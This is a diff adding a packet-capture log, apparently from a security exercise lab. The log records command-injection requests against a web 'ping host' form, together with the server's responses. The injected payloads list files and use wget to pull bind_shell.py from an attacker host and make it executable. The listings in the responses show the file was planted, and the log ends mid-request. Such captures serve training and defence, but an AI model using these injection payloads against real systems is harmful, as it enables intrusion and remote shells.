@@ -1,0 +1,375 @@
+interface: eth0 (192.168.1.0/255.255.255.0)
+match: HTTP
+
+T 192.168.33.1:60150 -> 192.168.1.100:80 [AP]
+GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/.
+Connection: keep-alive.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"564-WMF6q153UTMj4BbXMhLTNzlv8Is".
+.
+
+
+T 192.168.1.100:42012 -> 192.168.1.10:8080 [AP]
+GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"564-WMF6q153UTMj4BbXMhLTNzlv8Is".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:42012 [A]
+HTTP/1.1 200 OK.
+X-Powered-By: Express.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 1380.
+ETag: W/"564-1Wph8raUl4XV4oivZoei4qhPvmw".
+Date: Sat, 20 Jan 2018 15:24:37 GMT.
+Connection: close.
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=33.850 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=37.703 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=32.720 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 32.720/34.758/37.703/2.133 ms
+total 120
+-rw-r--r--   1 node  node    194 Jan 20  2018 bind.py
+-rwxrwxrwx   1 cyexc cyexc  2067 Jan 20 15:07 bind_shell.py
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.1
+-rw-r--r--   1 cyexc cyexc   525 Sep 30 11:11 index.ejs
+-rw-r--r--   1 cyexc cyexc   414 Sep 30 11:11 index.html
+drwxr-xr-x 263 root  root  12288 Jan 20 13:23 node_modules
+-rw-r--r--   1 root  root  78310 Jan 20 13:23 package-lock.json
+-rw-r--r--   1 
+
+T 192.168.1.100:80 -> 192.168.33.1:60150 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Sat, 20 Jan 2018 15:24:37 GMT.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 1380.
+Connection: keep-alive.
+X-Powered-By: Express.
+ETag: W/"564-1Wph8raUl4XV4oivZoei4qhPvmw".
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=33.850 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=37.703 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=32.720 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 32.720/34.758/37.703/2.133 ms
+total 120
+-rw-r--r--   1 node  node    194 Jan 20  2018 bind.py
+-rwxrwxrwx   1 cyexc cyexc  2067 Jan 20 15:07 bind_shell.py
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.1
+-rw-r--r--   1 cyexc cyexc   525 Sep 30 11:11 index.ejs
+-rw-r--r--   1 cyexc cyexc   414 Sep 30 11:11 index.html
+drwxr-xr-x 263 root  root  12288 Jan 20 13:23 node_modules
+-rw-r--r--   1 root  root  78310 Jan 20 13:23 packag
+
+T 192.168.33.1:60150 -> 192.168.1.100:80 [AP]
+GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/getPage?host=8.8.8.8%3Bls+-l.
+Connection: keep-alive.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"34a-R3dNQ0XMXolvLAGKXRMcuNy3tiM".
+.
+
+
+T 192.168.1.100:42013 -> 192.168.1.10:8080 [AP]
+GET /getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/getPage?host=8.8.8.8%3Bls+-l.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"34a-R3dNQ0XMXolvLAGKXRMcuNy3tiM".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:42013 [AP]
+HTTP/1.1 200 OK.
+X-Powered-By: Express.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 842.
+ETag: W/"34a-yryfxnAKTVz1yl+VETyftnAfh4k".
+Date: Sat, 20 Jan 2018 15:25:03 GMT.
+Connection: close.
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=25.822 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=30.606 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=26.936 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 25.822/27.788/30.606/2.044 ms
+<br>
+    
+  </h5>
+</body>
+</html>
+
+
+T 192.168.1.100:80 -> 192.168.33.1:60150 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Sat, 20 Jan 2018 15:25:03 GMT.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 842.
+Connection: keep-alive.
+X-Powered-By: Express.
+ETag: W/"34a-yryfxnAKTVz1yl+VETyftnAfh4k".
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=25.822 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=30.606 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=26.936 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 25.822/27.788/30.606/2.044 ms
+<br>
+    
+  </h5>
+</body>
+</html>
+
+
+T 192.168.33.1:60150 -> 192.168.1.100:80 [AP]
+GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1.
+Host: target.cyexc-target.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py.
+Connection: keep-alive.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"564-1Wph8raUl4XV4oivZoei4qhPvmw".
+.
+
+
+T 192.168.1.100:42015 -> 192.168.1.10:8080 [AP]
+GET /getPage?host=8.8.8.8%3Bls+-l HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.1.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.1.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.
+Accept-Language: ja,en-US;q=0.7,en;q=0.3.
+Accept-Encoding: gzip, deflate.
+Referer: http://target.cyexc-target/getPage?host=8.8.8.8%3Bwget+http%3A%2F%2Fattacker.cyexc-attacker%3A8081%2Fbind_shell.py%3Bchmod+777+bind_shell.py.
+Upgrade-Insecure-Requests: 1.
+If-None-Match: W/"564-1Wph8raUl4XV4oivZoei4qhPvmw".
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:42015 [A]
+HTTP/1.1 200 OK.
+X-Powered-By: Express.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 1442.
+ETag: W/"5a2-rn9ISyUq3SAWIhmVJ2C2a47jyvw".
+Date: Sat, 20 Jan 2018 15:25:08 GMT.
+Connection: close.
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=31.368 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=27.398 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=31.310 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 27.398/30.025/31.368/1.858 ms
+total 124
+-rw-r--r--   1 node  node    194 Jan 20  2018 bind.py
+-rwxrwxrwx   1 cyexc cyexc  2067 Jan 20 15:07 bind_shell.py
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.1
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.2
+-rw-r--r--   1 cyexc cyexc   525 Sep 30 11:11 index.ejs
+-rw-r--r--   1 cyexc cyexc   414 Sep 30 11:11 index.html
+drwxr-xr-x 263 root  root  12288 Jan 20 13:23 node_modules
+-rw-r--r--   1 ro
+
+T 192.168.1.100:80 -> 192.168.33.1:60150 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Sat, 20 Jan 2018 15:25:08 GMT.
+Content-Type: text/html; charset=utf-8.
+Content-Length: 1442.
+Connection: keep-alive.
+X-Powered-By: Express.
+ETag: W/"5a2-rn9ISyUq3SAWIhmVJ2C2a47jyvw".
+.
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<title>Send HTML Payload</title>
+<style type="text/css">
+</style>
+</head>
+<body>
+  <form method="GET" action="/getPage">
+    <p>
+      <input type="text" name="host">
+      <input type="submit" value="ping host">
+    </p>
+  </form>
+
+  <h5 style="color:red">
+    
+      <br><hr>
+      PING 8.8.8.8 (8.8.8.8): 56 data bytes
+64 bytes from 8.8.8.8: icmp_seq=0 ttl=61 time=31.368 ms
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=61 time=27.398 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=61 time=31.310 ms
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 27.398/30.025/31.368/1.858 ms
+total 124
+-rw-r--r--   1 node  node    194 Jan 20  2018 bind.py
+-rwxrwxrwx   1 cyexc cyexc  2067 Jan 20 15:07 bind_shell.py
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.1
+-rw-r--r--   1 cyexc cyexc  2025 Jan 14 19:25 bind_shell.py.2
+-rw-r--r--   1 cyexc cyexc   525 Sep 30 11:11 index.ejs
+-rw-r--r--   1 cyexc cyexc   414 Sep 30 11:11 index.html
+drwxr-xr-x 263 root  root  12288 Jan 20 13:23 nod
+
+T 192.168.33.1:60150 -> 192.168.1.100:80 [AP]
+GET /getPage?h
